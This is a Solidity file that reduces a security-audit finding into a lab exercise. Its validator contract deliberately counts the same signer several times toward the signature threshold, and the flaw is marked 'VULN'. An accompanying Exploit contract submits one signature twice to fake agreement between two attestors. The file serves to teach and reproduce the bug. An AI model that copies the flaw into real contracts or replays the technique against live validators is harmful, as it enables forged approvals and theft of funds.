// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    SXT — [C-01] Accepting duplicate signatures from one signer
    (Pashov Audit Group 2025-03, finding #63314)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: SubstrateSignatureValidator.validateMessage counts each
    recovered attestor toward the threshold without deduplicating, so the
    same (v,r,s) can be repeated to fake multi-attestor consensus.
    Blamed increment preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced SubstrateSignatureValidator.
/// Source: pashov/audits SXT-security-review_2025-03-31.
contract SubstrateSignatureValidator {
    address[] private _attestors;
    uint256 private _threshold;

    constructor(address[] memory attestors_, uint256 threshold_) {
        require(threshold_ > 0 && threshold_ <= attestors_.length, "th");
        // Expect sorted ascending (matches production)
        for (uint256 i = 1; i < attestors_.length; i++) {
            require(attestors_[i] > attestors_[i - 1], "sorted");
        }
        _attestors = attestors_;
        _threshold = threshold_;
    }

    function threshold() external view returns (uint256) {
        return _threshold;
    }

    function attestorsLength() external view returns (uint256) {
        return _attestors.length;
    }

    function validateMessage(bytes32 message, bytes32[] memory r, bytes32[] memory s, uint8[] memory v)
        external
        view
        returns (bool)
    {
        uint256 signaturesLength = r.length;
        require(s.length == signaturesLength && v.length == signaturesLength, "len");

        uint256 attestorsLength = _attestors.length;
        uint256 validSignaturesCount;
        uint256 attestorIndex;

        for (uint256 i = 0; i < signaturesLength; ++i) {
            address recoveredAddress = ecrecover(message, v[i], r[i], s[i]);

            // Reset scan if unsorted/dup submissions break monotonic walk
            attestorIndex = 0;
            while (attestorIndex < attestorsLength && _attestors[attestorIndex] < recoveredAddress) {
                ++attestorIndex;
            }

            if (attestorIndex < attestorsLength && _attestors[attestorIndex] == recoveredAddress) {
                ++validSignaturesCount; // @> VULN: no dedup — same signer counted multiple times toward threshold
                // FIX: mark seen[recovered] and skip if already counted
            }

            if (validSignaturesCount == _threshold) return true;
        }
        return false;
    }
}

/// @dev Helper that "signs" by returning fixed (v,r,s) whose ecrecover maps to a known attestor.
/// We precompute attestors from ecrecover of fixed values (same as finding PoC).
/// CREATE: validator(1)
contract Exploit {
    SubstrateSignatureValidator public validator;
    bytes32 public message;
    bool public accepted;

    // Fixed signature material from the finding's PoC
    bytes32 public constant R1 = bytes32(uint256(0x1));
    bytes32 public constant S1 = bytes32(uint256(0x3));
    uint8 public constant V1 = 27;

    address public attestor0;
    address public attestor1;

    constructor() {
        message = keccak256("test");
        // Derive attestor addresses the same way as the finding PoC
        attestor0 = ecrecover(message, V1, R1, S1);
        attestor1 = ecrecover(message, V1, bytes32(uint256(0x2)), bytes32(uint256(0x4)));
        require(attestor0 != address(0) && attestor1 != address(0), "ecrecover");
        require(attestor0 != attestor1, "distinct");

        // Sort for constructor requirement
        address[] memory attestors = new address[](2);
        if (attestor0 < attestor1) {
            attestors[0] = attestor0;
            attestors[1] = attestor1;
        } else {
            attestors[0] = attestor1;
            attestors[1] = attestor0;
        }
        // Threshold 2 — needs two DISTINCT attestors, but we will replay one sig twice
        validator = new SubstrateSignatureValidator(attestors, 2);
    }

    function run() external {
        // Only attestor0 signed — submit the same signature twice
        bytes32[] memory r = new bytes32[](2);
        r[0] = R1;
        r[1] = R1;
        bytes32[] memory s = new bytes32[](2);
        s[0] = S1;
        s[1] = S1;
        uint8[] memory v = new uint8[](2);
        v[0] = V1;
        v[1] = V1;

        accepted = validator.validateMessage(message, r, s, v);
        // Harm: threshold=2 met with a single unique signer via duplicate sigs
        require(accepted, "duplicate sigs must pass threshold (bug)");
    }
}
